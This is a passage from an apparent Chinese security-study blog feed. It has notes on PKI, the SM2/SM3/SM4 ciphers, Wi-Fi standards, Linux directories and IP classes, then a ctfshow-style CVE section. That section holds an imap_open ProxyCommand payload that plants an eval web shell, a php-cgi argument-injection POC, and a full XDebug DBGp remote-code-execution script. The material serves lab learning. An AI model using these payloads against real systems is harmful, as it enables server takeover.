<p>集中储存已经颁发的证书和公钥，用户可以方便地在证书库中查询其他证书等相关信息。数字证书库的存放方式为目录服务器、关系数据库等。通常用的是 LDAP 目录。</p>
<h4 id="密钥备份及恢复系统"><a class="markdownIt-Anchor" href="#密钥备份及恢复系统"></a> 密钥备份及恢复系统：</h4>
<p>它是密钥管理体系的核心，如果用户不小心丢失数据的解密密钥，则无法解密曾经加密的数据。这个系统能够解决此类问题。在数字证书生成的同时，认证机构 CA 备份了加密密钥，并将它储存在数字证书库中，当用户因丢失密钥等原因需要重新找回密钥时，可以向认证机构 CA 提出申请，CA 为用户恢复密钥。</p>
<h4 id="证书撤销系统"><a class="markdownIt-Anchor" href="#证书撤销系统"></a> 证书撤销系统：</h4>
<p>因为用户丢失密钥，或者是用户的身份有所变化，证书超出有效期限，证书就要做相应的更新，产生新的证书，撤销原来旧的证书。证书撤销处理系统作为 PKI 体系中不可或缺的组成部分，要求 PKI 体系为证书撤销系统提供一整套管理机制。 证书自生成之后，PKI 系统会自动检查证书是否要超出有效期限，每过一段时间自动更新证书，在到期之前，CA 会启动更新程序，新生成一个证书，然后撤销过期的证书。</p>
<h4 id="应用接口api"><a class="markdownIt-Anchor" href="#应用接口api"></a> 应用接口（API）：</h4>
<p>PKI 体系为用户提供通讯和使用等安全服务，它对应用接口的安全要求也非常的高。性能高的应用接口系统，能够满足 PKI 体系的各种功能的实现，如用户对证书的查询，涉及撤销证书的一些信息等，应用接口系统能够保证在安全、可靠的前提下使 PKI 体系和它的各种应用程序运行良好。</p>
<h2 id="3国密系列"><a class="markdownIt-Anchor" href="#3国密系列"></a> 3.国密系列:</h2>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250923195319233.png" alt="image-20250923195319233" /></p>
<h3 id="1sm2椭圆曲线公钥算法"><a class="markdownIt-Anchor" href="#1sm2椭圆曲线公钥算法"></a> 1.sm2椭圆曲线公钥算法:</h3>
<ul>
<li><strong>数学基础</strong>：基于素数域椭圆曲线（推荐曲线参数：256位素数域），安全强度等同于RSA-3072。</li>
<li><strong>技术优势</strong> ：
<ul>
<li>签名速度比RSA快10倍，密钥长度更短（256位 vs 3072位）。</li>
<li>支持<strong>数字签名</strong> （SM2-with-SM3）、<strong>密钥交换</strong> （SM2-KE）和<strong>加密解密</strong>（SM2-ENC）。</li>
</ul>
</li>
</ul>
<h3 id="2sm3抗碰撞哈希算法"><a class="markdownIt-Anchor" href="#2sm3抗碰撞哈希算法"></a> 2.sm3抗碰撞哈希算法:</h3>
<ul>
<li>设计特点
<ul>
<li>输出长度256位，采用Merkle-Damgård结构，压缩函数包含64轮迭代。</li>
<li>抗碰撞强度高于SHA-256（针对差分攻击优化）。</li>
</ul>
</li>
<li>应用场景
<ul>
<li>区块链（如蚂蚁链使用SM3作为默克尔树哈希）。</li>
<li>电子证照防篡改（公安部公民网络身份认证）。</li>
</ul>
</li>
</ul>
<h3 id="3sm4对称加密"><a class="markdownIt-Anchor" href="#3sm4对称加密"></a> 3.SM4对称加密:</h3>
<ul>
<li>
<p>算法结构</p>
<ul>
<li>分组长度128位，密钥长度128位，采用非平衡Feistel网络（32轮迭代）。</li>
<li>硬件友好性：可通过指令集（如ARM Crypto Extension）加速，性能比AES高20%。</li>
</ul>
</li>
<li>
<p>模式支持</p>
<ul>
<li>CBC、ECB、OFB、CFB、CTR、GCM等标准加密模式。</li>
<li>特殊模式：CBC-MAC（用于金融终端报文认证）。</li>
</ul>
</li>
</ul>
<h2 id="4无线局域网产品须使用的系列密码算法"><a class="markdownIt-Anchor" href="#4无线局域网产品须使用的系列密码算法"></a> 4.无线局域网产品须使用的系列密码算法:</h2>
<ol>
<li><strong>对称密码算法：SMS4</strong> SMS4是一种分组密码算法，分组长度和密钥长度均为128位。它具有高效性和安全性，主要用于对无线局域网中的数据进行加密，确保数据的机密性。</li>
<li><strong>签名算法：ECDSA</strong> ECDSA基于椭圆曲线密码学，提供数字签名功能，确保数据的完整性和真实性。其密钥长度较小但安全性高，同时支持身份认证，防止假冒攻击。该算法需采用国家密码管理局指定的椭圆曲线和参数。</li>
<li><strong>密钥协商算法：ECDH</strong> ECDH是一种基于椭圆曲线的密钥协商算法，可在不安全信道上安全地协商共享密钥，用于后续的加密通信。该算法同样需使用国家密码管理局指定的椭圆曲线和参数。</li>
<li><strong>杂凑算法：SHA-256</strong> SHA-256是一种安全散列算法，可将任意长度的数据转换为256位的固定长度输出。它具有高抗碰撞性，适用于数据完整性校验和身份验证，确保数据在传输过程中未被篡改。</li>
<li><strong>随机数生成算法</strong> 随机数生成算法用于生成随机数或密钥，确保通信的安全性。虽然未指定具体算法，但要求其具有良好的随机性、不可预测性和抗攻击性。</li>
</ol>
<h2 id="5wifi的加密标准"><a class="markdownIt-Anchor" href="#5wifi的加密标准"></a> 5.wifi的加密标准:</h2>
<h3 id="1wep"><a class="markdownIt-Anchor" href="#1wep"></a> 1.WEP:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">英文全称：Wired Equivalent Privacy</span><br><span class="line">中文名称：有线等效加密</span><br><span class="line">提出时间：1997</span><br><span class="line">使用的算法：RC4</span><br></pre></td></tr></table></figure>
<h3 id="2wpa"><a class="markdownIt-Anchor" href="#2wpa"></a> 2.WPA:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">英文全称：Wi-Fi Protected Access</span><br><span class="line">中文名称：Wi-Fi 访问保护</span><br><span class="line">提出时间：2003</span><br><span class="line">使用的算法：TKIP</span><br></pre></td></tr></table></figure>
<h3 id="3wpa2"><a class="markdownIt-Anchor" href="#3wpa2"></a> 3.WPA2:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">英文全称：Wi-Fi Protected Access Version 2</span><br><span class="line">中文名称：Wi-Fi 访问保护2代</span><br><span class="line">提出时间：2004</span><br><span class="line">使用的算法：AES-CCMP</span><br></pre></td></tr></table></figure>
<h3 id="4wpa3"><a class="markdownIt-Anchor" href="#4wpa3"></a> 4.Wpa3:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">英文全称：Wi-Fi Protected Access Version 3</span><br><span class="line">中文名称：Wi-Fi 访问保护3代</span><br><span class="line">提出时间：2018</span><br><span class="line">使用的算法：AES-GCMP</span><br></pre></td></tr></table></figure>
<h3 id="5wapi"><a class="markdownIt-Anchor" href="#5wapi"></a> 5.WAPI:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WAPI（Wireless LAN Authentication and Privacy Infrastructure，无线局域网鉴别与保密基础结构）是中国自主提出的无线局域网安全标准，旨在解决传统Wi-Fi（如WEP、WPA）的安全漏洞。</span><br><span class="line">2003年由中国国家标准化管理委员会发布（GB 15629.11系列），推动原因包括安全可控、减少对国外技术依赖，以及自主知识产权需求。</span><br><span class="line">终端（MT）与接入点（AP）需双向验证身份，采用数字证书（X.509格式），避免中间人攻击。</span><br><span class="line">SM4分组密码（原称SMS4），128位密钥，符合中国商用密码标准。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>信息安全工程师</category>
        <category>密码</category>
      </categories>
  </entry>
  <entry>
    <title>linxu</title>
    <url>/2025/10/12/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/linxu/</url>
    <content><![CDATA[<h2 id="1linxu系统结构目录"><a class="markdownIt-Anchor" href="#1linxu系统结构目录"></a> 1.linxu系统结构目录:</h2>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250923201111179.png" alt="image-20250923201111179" /></p>
<h3 id="1-bin"><a class="markdownIt-Anchor" href="#1-bin"></a> 1. /bin:</h3>
<p>bin 是 Binaries (二进制文件) 的缩写, 这个目录存放着最经常使用的命令。</p>
<h3 id="2-boot"><a class="markdownIt-Anchor" href="#2-boot"></a> 2. /boot:</h3>
<p>这里存放的是启动 Linux 时使用的一些核心文件，包括一些连接文件以及镜像文件。</p>
<h3 id="3-dev"><a class="markdownIt-Anchor" href="#3-dev"></a> 3. /dev:</h3>
<p>dev 是 Device(设备) 的缩写, 该目录下存放的是 Linux 的外部设备，在 Linux 中访问设备的方式和访问文件的方式是相同的。</p>
<h3 id="4-etc"><a class="markdownIt-Anchor" href="#4-etc"></a> 4. /etc:</h3>
<p>etc 是 Etcetera(等等) 的缩写,这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p>
<h3 id="5home"><a class="markdownIt-Anchor" href="#5home"></a> 5.home:</h3>
<p>用户的主目录，在 Linux 中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的</p>
<h3 id="6-root"><a class="markdownIt-Anchor" href="#6-root"></a> 6. /root:</h3>
<p>该目录为系统管理员，也称作超级权限者的用户主目录。</p>
<h3 id="7-run"><a class="markdownIt-Anchor" href="#7-run"></a> 7. /run:</h3>
<p>是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。</p>
<h3 id="8-sbin"><a class="markdownIt-Anchor" href="#8-sbin"></a> 8. /sbin:</h3>
<p>s 就是 Super User 的意思，是 Superuser Binaries (超级用户的二进制文件) 的缩写，这里存放的是系统管理员使用的系统管理程序。</p>
<h3 id="9-usr"><a class="markdownIt-Anchor" href="#9-usr"></a> 9. /usr:</h3>
<p>usr 是 unix system resources(unix 系统资源) 的缩写，这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于 windows 下的 program files 目录。</p>
<h3 id="10-var"><a class="markdownIt-Anchor" href="#10-var"></a> 10 . /var:</h3>
<p>var 是 variable(变量) 的缩写，这个目录中存放着在不断扩充着的东西，我们习惯将那些经常被修改的目录放在这个目录下。包括各种日志文件。</p>
<h3 id="11-proc"><a class="markdownIt-Anchor" href="#11-proc"></a> 11. <strong>/proc</strong>：</h3>
<p>proc 是 Processes(进程) 的缩写，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。</p>
<h3 id="12opt"><a class="markdownIt-Anchor" href="#12opt"></a> 12.<strong>/opt</strong>：</h3>
<p>opt 是 optional(可选) 的缩写，这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p>
]]></content>
      <categories>
        <category>信息安全工程师</category>
        <category>操作系统</category>
      </categories>
  </entry>
  <entry>
    <title>网络</title>
    <url>/2025/10/12/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<h2 id="1专有地址"><a class="markdownIt-Anchor" href="#1专有地址"></a> 1.专有地址：</h2>
<p>（1）10.0.0.0——10.255.255.255     10.0.0.0/8       A类专有地址<br />
（2）172.16.0.0——172.31.255.255    172.16.0.0/12     B类专有地址<br />
（3）192.168.0.0——192.168.255.255   192.168.0.0/16   C类专有地址</p>
<h2 id="2五种公有地址"><a class="markdownIt-Anchor" href="#2五种公有地址"></a> 2.五种公有地址:</h2>
<p><img src="C:%5CUsers%5Cwanyan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20250920205709669.png" alt="image-20250920205709669" /></p>
<ul>
<li>
<p>A类地址:    1.0.0.0——126.255.255.255     —最后一个是广播地址</p>
</li>
<li>
<p>B类地址:     128.0.0.0——191.255.255.255     —最后一个是广播地址</p>
</li>
<li>
<p>C类地址:     192.0.0.0——223.255.255.255      —最后一个是广播地址</p>
</li>
<li>
<p>D类地址:     224.0.0.0——239.255.255.255  多播地址</p>
</li>
<li>
<p>E类地址:      240.0.0.0 ——255.255.255.255  保留地址</p>
</li>
</ul>
<h2 id="3网卡接受数据帧的状态"><a class="markdownIt-Anchor" href="#3网卡接受数据帧的状态"></a> 3.网卡接受数据帧的状态:</h2>
<h3 id="1unicast单播"><a class="markdownIt-Anchor" href="#1unicast单播"></a> 1.Unicast（单播）</h3>
<ul>
<li>定义：Unicast是指网卡在工作时接收目的地址是本机硬件地址的数据帧。</li>
<li>工作原理：当网络中的数据包被发送到特定的目标地址时，如果该地址与网卡的硬件地址相匹配，则网卡会接收该数据包。这是网络通信中最常见的数据传输方式，确保了数据包能够准确地发送到指定的接收者。</li>
<li>应用场景：适用于点对点的通信场景，如客户端与服务器之间的数据传输。</li>
</ul>
<p>2.Broadcast（广播）</p>
<ul>
<li>定义：Broadcast是指接收所有类型为广播报文的数据帧。</li>
<li>工作原理：广播报文的目的地址被设置为特定的广播地址（如以太网中的FF:FF:FF:FF:FF:FF），当网卡接收到这样的报文时，无论其硬件地址是否与报文中的目的地址匹配，都会接收该报文。广播报文通常用于向网络中的所有设备发送信息。</li>
<li>应用场景：适用于需要向网络中的所有设备发送通知或请求的场景，如DHCP（动态主机配置协议）服务器向网络中的客户端分配IP地址时。</li>
</ul>
<p>3.Multicast（组播）</p>
<ul>
<li>定义：Multicast是指接收特定的组播报文。</li>
<li>工作原理：组播报文的目的地址被设置为一个特定的组播地址，该地址代表了一个特定的组。当网卡接收到与其加入的组相匹配的组播报文时，会接收该报文。组播允许将数据包发送到网络中的一个特定子集，而不是所有设备。</li>
<li>应用场景：适用于需要将数据发送到网络中的一个特定组的场景，如视频会议、在线游戏等。</li>
</ul>
<h3 id="4promiscuous混杂模式"><a class="markdownIt-Anchor" href="#4promiscuous混杂模式"></a> 4.Promiscuous（混杂模式）</h3>
<ul>
<li>
<p>定义：Promiscuous是通常说的混杂模式，是指对报文中的目的硬件地址不加任何检查，全部接收的工作模式。</p>
</li>
<li>
<p>工作原理：在混杂模式下，网卡会接收所有经过其网络接口的数据包，无论这些数据包的目的地址是什么。这使得网卡能够捕获和分析网络中的所有通信流量。</p>
</li>
<li>
<p>应用场景：</p>
<p>网络调试：开发人员可以使用混杂模式来捕获和分析网络流量，以便诊断和解决网络问题。<br />
网络监控：网络安全人员可以使用混杂模式来监控网络中的通信流量，以便检测潜在的安全威胁。<br />
网络分析：网络分析师可以使用混杂模式来收集和分析网络流量数据，以便了解网络的性能和使用情况。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>信息安全工程师</category>
        <category>计算机网络</category>
      </categories>
  </entry>
  <entry>
    <title>cve</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/cve/</url>
    <content><![CDATA[<h2 id="1-cve-2019-11043php缓冲区下溢"><a class="markdownIt-Anchor" href="#1-cve-2019-11043php缓冲区下溢"></a> 1. CVE-2019-11043(PHP缓冲区下溢):</h2>
<p><a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">该漏洞产生与Nginx利用fastcgi_split_path_info在处理带有 %<span class="number">0</span>a 的请求时，会因为遇到换行符（%<span class="number">0</span>a）导致PATH_INFO为空，最终可导致任意代码执行。</span><br><span class="line">PHP versions <span class="number">7.1</span>.x below <span class="number">7.1</span>.<span class="number">33</span>, <span class="number">7.2</span>.x below <span class="number">7.2</span>.<span class="number">24</span> <span class="keyword">and</span> <span class="number">7.3</span>.x below <span class="number">7.3</span>.<span class="number">11</span></span><br></pre></td></tr></table></figure>
<h3 id="1条件"><a class="markdownIt-Anchor" href="#1条件"></a> 1.条件:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Web 服务器运行 nginx + php-<span class="title function_ invoke__">fpm</span>(fast-CGI Process Manager)</span><br><span class="line">    nginx具有类似配置:</span><br><span class="line">location ~ [^/]\.<span class="title function_ invoke__">php</span>(/|$) &#123;</span><br><span class="line">  ...</span><br><span class="line">  fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line">  fastcgi_param PATH_INFO       <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">  fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2cve-2018-19518邮件收发"><a class="markdownIt-Anchor" href="#2cve-2018-19518邮件收发"></a> 2.CVE-2018-19518(邮件收发):</h2>
<p><a href="https://www.cnblogs.com/Junglezt/p/18119142">https://www.cnblogs.com/Junglezt/p/18119142</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</span><br><span class="line"></span><br><span class="line">因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># BASE64 编码 &lt;?=eval($_GET[1])?&gt;</span></span><br><span class="line"><span class="comment"># 得到 PD89ZXZhbCgkX0dFVFsxXSk/Pg==</span></span><br><span class="line"><span class="comment"># BASE64 编码 + URL编码 echo &quot;PD89ZXZhbCgkX0dFVFsxXSk/Pg==&quot; | base64 -d &gt; /var/www/html/shell.php</span></span><br><span class="line"><span class="comment"># 得到 ZWNobyAiUEQ4OVpYWmhiQ2drWDBkRlZGc3hYU2svUGc9PSIgfCBiYXNlNjQgLWQgPiAvdmFyL3d3dy9odG1sL3NoZWxsLnBocA%3D%3D</span></span><br><span class="line"><span class="comment"># hostname = x+-oProxyCommand%3decho%09 + 编码后的命令 + |base64%09-d|sh&#125;</span></span><br><span class="line">username=xxx&amp;password=xxx&amp;hostname=x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>ZWNobyAiUEQ4OVpYWmhiQ2drWDBkRlZGc3hYU2svUGc9PSIgfCBiYXNlNjQgLWQgPiAvdmFyL3d3dy9odG1sL3NoZWxsLnBocA%<span class="number">3</span>D%<span class="number">3</span>D|base64%<span class="number">09</span>-d|sh&#125;</span><br></pre></td></tr></table></figure>
<h2 id="3cve-2012-1823php-cgi命令执行"><a class="markdownIt-Anchor" href="#3cve-2012-1823php-cgi命令执行"></a> 3.CVE-2012-1823(PHP-CGI命令执行):</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &lt; <span class="number">5.3</span>.<span class="number">12</span> <span class="keyword">or</span> php &lt; <span class="number">5.4</span>.<span class="number">2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php-CGI:</span><br><span class="line">-c 指定php.ini文件（PHP的配置文件）的位置</span><br><span class="line">-n 不要加载php.ini文件</span><br><span class="line">-d 指定配置项</span><br><span class="line">-b 启动fastcgi进程</span><br><span class="line">-s 显示文件源码</span><br><span class="line">-T 执行指定次该文件</span><br><span class="line">-h和-? 显示帮助</span><br><span class="line"> </span><br><span class="line">POC:</span><br><span class="line">    -d+allow_url_include%<span class="number">3</span>don+-d+auto_prepend_file%<span class="number">3</span>dphp%<span class="number">3</span>a<span class="comment">//input</span></span><br><span class="line">        </span><br><span class="line">   POST:</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="keyword">eval</span>(<span class="string">&quot;&quot;</span>));<span class="meta">?&gt;</span></span><br><span class="line">      </span><br></pre></td></tr></table></figure>
<h2 id="4php-xdebug远程调试漏洞"><a class="markdownIt-Anchor" href="#4php-xdebug远程调试漏洞"></a> 4.PHP XDebug远程调试漏洞:</h2>
<p>XDebug是一个用于调试PHP代码的扩展。当启用远程调试模式并设置适当的配置时，攻击者可以通过利用调试协议(DBGp)在目标服务器上执行任意PHP代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xdebug2.x:</span><br><span class="line">xdebug.remote_connect_back = <span class="number">1</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br><span class="line">xdebug3.x:</span><br><span class="line">xdebug.mode = debug</span><br><span class="line">xdebug.discover_client_host = <span class="number">1</span></span><br><span class="line">xdebug.client_host = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>该脚本只能在有公网ip的服务器或者和靶机在同一个内网</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line">server_done = threading.Event()</span><br><span class="line">server_started = threading.Event()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_xml</span>(<span class="params">sock: socket.socket</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    blocks = []</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.find(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.append(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XDebugRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Recieve data from %s&#x27;</span>, <span class="variable language_">self</span>.client_address)</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&#x27;&#x27;</span>.join([<span class="string">b&#x27;eval -i 1 -- &#x27;</span>, base64.b64encode(<span class="variable language_">self</span>.server.code.encode()), <span class="string">b&#x27;\x00&#x27;</span>]))</span><br><span class="line">        data = recv_xml(<span class="variable language_">self</span>.request)</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.decode())</span><br><span class="line">        g = re.search(<span class="string">rb&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> g:</span><br><span class="line">            logging.warning(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        data = g.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.info(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.b64decode(data).decode())</span><br><span class="line">            server_done.<span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">except</span> binascii.Error <span class="keyword">as</span> e:</span><br><span class="line">            logging.error(<span class="string">&#x27;[-] May be not string result: %s&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">XDebugServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, server_address, handler_class, code</span>):</span><br><span class="line">        <span class="variable language_">self</span>.code = code</span><br><span class="line">        <span class="variable language_">self</span>.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(server_address, handler_class)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">server_activate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().server_activate()</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Server %s started&#x27;</span>, <span class="variable language_">self</span>.server_address)</span><br><span class="line">        server_started.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_dbgp_server</span>(<span class="params">port: <span class="built_in">int</span>, code: <span class="built_in">str</span></span>):</span><br><span class="line">    server = XDebugServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, port), XDebugRequestHandler, code)</span><br><span class="line">    server_thread = threading.Thread(target=server.serve_forever, daemon=<span class="literal">True</span>)</span><br><span class="line">    server_thread.start()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> server_thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_debug_session</span>(<span class="params">url: <span class="built_in">str</span>, attack_ip: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_started.wait(timeout=<span class="number">5</span>)</span><br><span class="line">        logging.info(<span class="string">&#x27;[+] Trigger debug session&#x27;</span>)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> attack_ip:</span><br><span class="line">            headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>] = attack_ip</span><br><span class="line"></span><br><span class="line">        requests.get(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&amp;XDEBUG_SESSION=1&amp;XDEBUG_TRIGGER=1&#x27;</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--dbgp-ip&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;dbgp server ip address, must can be accessed from target server.&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    start_dbgp_server(<span class="number">9000</span>, args.code)</span><br><span class="line">    start_dbgp_server(<span class="number">9003</span>, args.code)</span><br><span class="line">    threading.Thread(target=trigger_debug_session, args=(args.target, args.dbgp_ip), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Wait with a timeout, but check for interrupts</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            <span class="keyword">if</span> server_done.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;[-] Execution timed out&#x27;</span>)            </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        logging.info(<span class="string">&#x27;[*] Received keyboard interrupt, exiting...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/jwt/</url>
    <content><![CDATA[<h2 id="1使用flask-unsign伪造"><a class="markdownIt-Anchor" href="#1使用flask-unsign伪造"></a> 1.使用flask-unsign伪造:</h2>
